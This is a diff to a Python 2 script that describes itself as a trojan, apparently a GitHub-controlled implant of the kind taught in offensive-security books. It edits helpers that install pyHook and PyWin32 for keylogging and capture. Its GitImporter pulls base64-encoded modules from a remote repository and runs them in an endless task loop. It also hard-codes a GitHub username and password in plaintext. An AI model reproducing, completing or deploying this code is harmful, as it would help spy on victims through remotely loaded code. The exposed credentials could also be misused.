@@ -25,15 +25,13 @@ def get_wheel(wheel):
     file_contant = base64.b64decode(str(file_contant))
     fo.write(file_contant)
     fo.close()
-def install_and_import(package,toimport):#installed wheel files and imports the relevant thing
+def install_and_import(package):#installed wheel files and imports the relevant thing
     import importlib
     try:
         importlib.import_module(package)
     except ImportError:
         pip.main(['install', package])
-    finally:
-        for x in toimport:
-            globals()[package] = importlib.import_module(x)
+
 def connect_to_github():#log into github
     gh = login(username="haxxx42",password="yotam1709")#details for login
     repo = gh.repository("haxxx42","chapter7")#name of repository
@@ -91,7 +89,12 @@ class GitImporter(object):#custom importer!
                 self.current_module_code = base64.b64decode(new_library)
                 #decode it and put it into the current module code
                 return self#return the current module code
-        return None#return nothing in case the trojan is not configured
+        try:
+            print "[*] Attempting to import %s" % fullname
+            importlib.import_module(fullname, package=None)
+            return None
+        except:
+            return None#return nothing in case the trojan is not configured
     
     def load_module(self,name):#load a module
         module = imp.new_module(name)#create a blank module object
@@ -113,8 +116,10 @@ def module_runner(module):
     # main trojan loop
 get_wheel("pyHook")
 get_wheel("PyWin32")
-install_and_import("pyHook",["pyHook"])#cant make modules import out of github
-install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
+#install_and_import("pyHook",["pyHook"])#cant make modules import out of github
+install_and_import("pyHook")#cant make modules import out of github
+install_and_import("PyWin32")#so installing them manualy with pip
+#install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
